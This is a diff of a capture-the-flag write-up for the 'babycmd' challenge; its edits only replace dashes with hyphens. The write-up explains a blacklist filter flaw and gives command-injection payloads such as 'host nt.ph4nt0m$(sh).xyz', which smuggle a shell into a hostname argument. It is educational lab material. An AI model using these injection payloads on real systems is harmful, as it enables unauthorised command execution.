@@ -29,7 +29,7 @@ authors:
     FORTIFY:  Enabled
 ```
 
-With a stack canary and NX in place, classic stack overflows and shellcode injection are out. The vulnerability lives in the application logic layer — command injection via a poorly filtered shell command template.
+With a stack canary and NX in place, classic stack overflows and shellcode injection are out. The vulnerability lives in the application logic layer - command injection via a poorly filtered shell command template.
 
 ## Running the program
 
@@ -62,8 +62,8 @@ The binary accepts four commands: `ping`, `dig`, `host`, and `exit`. Each runs t
 ```c
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
-  char v9[272];   // [rsp+0h]  [rbp-258h]  — raw input buffer
-  char dest[264]; // [rsp+110h] [rbp-148h] — command name
+  char v9[272];   // [rsp+0h]  [rbp-258h]  - raw input buffer
+  char dest[264]; // [rsp+110h] [rbp-148h] - command name
 
   ...
   while ( 1 )
@@ -83,7 +83,7 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
 }
 ```
 
-### Blacklist filter — `check_D65`
+### Blacklist filter - `check_D65`
 
 All three handlers call `check_D65` before constructing the shell command. It copies each character of the user's argument into a sanitized buffer, but returns 0 (failure) for the following characters:
 
@@ -98,7 +98,7 @@ __int64 __fastcall check_D65(char *cmd, _BYTE *a2)
   if ( (v2 & 253) == '!' ) return 0;   // ! and #
   if ( (unsigned __int8)(v2 - ':') > 1u )
   {
-    *a2++ = v2;  // passed all the checks above — copy
+    *a2++ = v2;  // passed all the checks above - copy
     goto LABEL_9;
   }
   return 0;  // ; and :
@@ -125,7 +125,7 @@ if ( inet_aton(cp, &in) )  // validate IPv4 format
 __sprintf_chk(command, 1LL, 384LL, "dig '%s'", cp);
 ```
 
-The argument is wrapped in **single quotes**. Inside single quotes, the shell treats everything literally — `$()` and backtick substitution don't expand. No injection.
+The argument is wrapped in **single quotes**. Inside single quotes, the shell treats everything literally - `$()` and backtick substitution don't expand. No injection.
 
 ### The `host` handler
 
@@ -135,7 +135,7 @@ __sprintf_chk(command, 1LL, 384LL, "host \"%s\"", cp);
 
 The argument is wrapped in **double quotes**. Inside double quotes, the shell still expands `$()` and `` `...` `` command substitution. This is the injection point.
 
-### Secondary filter — `check2_DCC`
+### Secondary filter - `check2_DCC`
 
 For non-IP arguments, `dig` and `host` also call `check2_DCC`, which checks:
 - Total argument length <= 63 characters
@@ -166,16 +166,16 @@ So the payload must start and end with an alphanumeric character.
 The shell supports two forms of command substitution:
 
 ```bash
-echo $(echo $(ls))     # dollar-paren — nests cleanly
-echo `echo \`ls\``     # backtick — needs escaping to nest
-echo `echo `ls``       # broken — the inner backtick closes the outer one
+echo $(echo $(ls))     # dollar-paren - nests cleanly
+echo `echo \`ls\``     # backtick - needs escaping to nest
+echo `echo `ls``       # broken - the inner backtick closes the outer one
 ```
 
 Since `$` passes the blacklist and parentheses aren't blocked either, `$(...)` is the reliable choice.
 
 ## Exploit
 
-### Step 1 — confirm injection
+### Step 1 - confirm injection
 
 ```
 : host nt.ph4nt0m$(ls).xyz
@@ -190,7 +190,7 @@ horcruxes.xyz not found: 3(NXDOMAIN)
 
 The output of `ls` gets inserted into the hostname. The command is being executed.
 
-### Step 2 — attempt to read the flag directly
+### Step 2 - attempt to read the flag directly
 
 Trying `$(cat flag)` fails, because the shell concatenates the command name and argument with no space:
 
@@ -201,7 +201,7 @@ sh: 1: catflag: not found
 
 The injected output becomes part of the hostname token. Running a command that contains a space requires a full interactive shell.
 
-### Step 3 — spawn a shell with `$(sh)`
+### Step 3 - spawn a shell with `$(sh)`
 
 ```
 : host nt.ph4nt0m$(sh).xyz
@@ -216,9 +216,9 @@ Host nt.ph4nt0m[+] Exploit Success.xyz not found: 3(NXDOMAIN)
 
 ```
 host nt.ph4nt0m$(sh).xyz
-       ^^^^^^^^           — alphanumeric prefix (satisfies check2_DCC's first-char rule)
-               ^^^^       — $() command substitution, not blocked by check_D65
-                   ^^^^   — alphanumeric suffix (satisfies check2_DCC's last-char rule)
+       ^^^^^^^^           - alphanumeric prefix (satisfies check2_DCC's first-char rule)
+               ^^^^       - $() command substitution, not blocked by check_D65
+                   ^^^^   - alphanumeric suffix (satisfies check2_DCC's last-char rule)
 ```
 
 The final shell command the binary constructs:
@@ -231,4 +231,4 @@ The double-quote context allows `$(sh)` to expand, spawning a shell that then re
 
 ## Summary
 
-`babycmd` demonstrates how fragile blacklist-based input sanitization can be. The filter correctly blocked the obvious metacharacters (`|`, `;`, `&`), but missed `$` — the crux of `$(...)` command substitution. The `dig` handler was safe because single quotes block all substitution, whereas `host` used double quotes so `$()` still expanded. The secondary length and alphanumeric boundary checks were easy to satisfy by wrapping the substitution code between innocuous hostname fragments.
+`babycmd` demonstrates how fragile blacklist-based input sanitization can be. The filter correctly blocked the obvious metacharacters (`|`, `;`, `&`), but missed `$` - the crux of `$(...)` command substitution. The `dig` handler was safe because single quotes block all substitution, whereas `host` used double quotes so `$()` still expanded. The secondary length and alphanumeric boundary checks were easy to satisfy by wrapping the substitution code between innocuous hostname fragments.
